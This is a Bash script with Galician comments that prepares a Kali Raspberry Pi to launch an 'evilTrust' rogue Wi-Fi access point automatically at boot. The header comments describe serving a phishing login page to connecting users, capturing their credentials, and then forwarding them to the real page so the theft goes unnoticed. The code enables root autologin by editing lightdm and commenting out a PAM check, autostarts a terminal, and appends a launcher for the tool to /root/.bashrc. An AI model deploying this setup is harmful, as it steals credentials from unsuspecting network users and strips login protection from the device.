# This work is licensed under a Creative Commons Attribution-ShareAlike 4.0 International License
# Creative Commons License: http://creativecommons.org/licenses/by-sa/4.0/
# Author: Ricardo Feijoo Costa
# DATA: 2022-01-01 11:22:28.052032306 +0100

#!/bin/bash     #Liña necesaria para saber que shell executará o script

##O sistema está modificado para que:
##a) Cando un usuario se conecte á rede WIFI aparécelle a páxina phishing de autenticación.
##b) Unha vez que introduza os credenciais estes son capturados.
##c) Reenvíase directamente ao cliente á páxina real de autenticación. Así, simulamos que a primeira vez errou na autenticación e debe voltar a pór usuario/contrasinal, pero desta segunda vez farao na páxina real ;)

##FUNCIONS
function f_autologin_root(){
  #Autologin root en xfce4 sen solicitar contrasinal ➝ https://hackersgrid.com/2020/03/raspberry-pi-autologin-kali.html
  ##/etc/lightdm/ligthdm.conf ➝ na sección [Seat:*]
  ##  autologin-user = root
  ##  autologin-user-timeout = 0
  FILEGUI='/etc/lightdm/lightdm.conf'
  NUMBER=$(grep -n '^\[Seat:\*\]' ${FILEGUI} | cut -d':' -f1)
  sed -i "${NUMBER}a\autologin-user = root\\nautologin-user-timeout = 0" ${FILEGUI}

  ##/etc/pam.d/lightdm-autologin ➝ Comentar liña != root
  ##  auth required pam_succeed_if.so user != root quiet_success
  FILEPAM='/etc/pam.d/lightdm-autologin'
  NUMBER=$(grep -n '!= root' ${FILEPAM} | cut -d':' -f1)
  sed -i "${NUMBER}s/^/#/" ${FILEPAM}
}

function f_terminator(){
  #Comprobar instalación e se é o caso instalar terminator
  command -v terminator
  [ $? -ne 0 ] && apt update && apt -y install terminator
}

function f_autoboot_terminal(){
  #Unha vez arrancado xfce4 arrancar app terminator
  DIR_AUTOSTART='/root/.config/autostart'
  mkdir -p ${DIR_AUTOSTART} && chown root. ${DIR_AUTOSTART} && chmod 700 ${DIR_AUTOSTART}
  FILE="${DIR_AUTOSTART}/terminator.desktop"
  cat > ${FILE} <<EOF
[Desktop Entry]
Encoding=UTF-8
Version=0.9.4
Type=Application
Name=terminator
Comment=Auto Start Terminal terminator
Exec=/usr/bin/terminator
OnlyShowIn=XFCE;
RunHook=0
StartupNotify=false
Terminal=false
Hidden=false
EOF
  chown root. ${FILE} && chmod 644 ${FILE}
}

function f_bashrc(){
  FILE='/root/.bashrc'
  echo 'clear
setxkbmap es
cd ~/evilTrust-kali-rpi-Automatic-Boot
ps -ef | grep -i evilTrust.sh | grep -v grep
if [ $? -ne 0 ]; then
  bash exec.sh
fi' >> ${FILE}	
}

function f_reboot(){
  #No seguinte arranque a ferramenta Rogue AP actívase de forma automática ;)
  reboot
}

function f_main(){
  f_autologin_root
  f_terminator
  f_autoboot_terminal
  f_bashrc
  f_reboot
}

##main()
f_main
